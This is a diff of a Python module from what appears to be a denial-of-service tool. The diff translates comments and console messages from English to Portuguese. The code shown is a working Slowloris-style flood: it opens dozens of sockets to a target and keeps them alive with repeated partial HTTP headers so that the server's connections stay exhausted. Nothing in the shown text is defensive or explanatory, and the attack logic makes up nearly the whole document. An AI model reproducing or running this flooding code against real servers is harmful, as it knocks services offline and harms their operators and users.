@@ -1,10 +1,10 @@
-# Import modules
+# Importa os modulos
 import random
 import socket
 import tools.randomData as randomData
 from colorama import Fore
 
-# Init socket
+# Socket inicial
 def create_socket(target):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -19,33 +19,33 @@ def create_socket(target):
         )
         sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
     except socket.timeout:
-        print(f"{Fore.RED}[-] {Fore.MAGENTA}Timed out..{Fore.RESET}")
+        print(f"{Fore.RED}[-] {Fore.MAGENTA}Tempo esgotado..{Fore.RESET}")
     except socket.error:
-        print(f"{Fore.RED}[-] {Fore.MAGENTA}Failed create socket{Fore.RESET}")
+        print(f"{Fore.RED}[-] {Fore.MAGENTA}Ocorreu um erro ao criar socket{Fore.RESET}")
     else:
-        print(f"{Fore.GREEN}[+] {Fore.YELLOW}Socket created..{Fore.RESET}")
+        print(f"{Fore.GREEN}[+] {Fore.YELLOW}Socket criado..{Fore.RESET}")
         return sock
 
 
 def flood(target):
-    # Create sockets
+    # Criar sockets
     sockets = []
     for _ in range(random.randint(20, 60)):
         sock = create_socket(target)
         if not sock:
             continue
         sockets.append(sock)
-    # Send keep-alive headers
+    # Envia headers keep-alive
     for _ in range(4):
         for index, sock in enumerate(sockets):
             try:
                 sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
             except socket.error:
                 print(
-                    f"{Fore.RED}[-] {Fore.MAGENTA}Failed to send keep-alive headers{Fore.RESET}"
+                    f"{Fore.RED}[-] {Fore.MAGENTA}Ocorreu um erro ao enviar headers keep-alive{Fore.RESET}"
                 )
                 sockets.remove(sock)
             else:
                 print(
-                    f"{Fore.GREEN}[+] {Fore.YELLOW}Sending keep-alive headers to {'{}:{}'.format(*target)} from socket {index + 1}. {Fore.RESET}"
+                    f"{Fore.GREEN}[+] {Fore.YELLOW}Enviando headers keep-alive para {'{}:{}'.format(*target)} from socket {index + 1}. {Fore.RESET}"
                 )
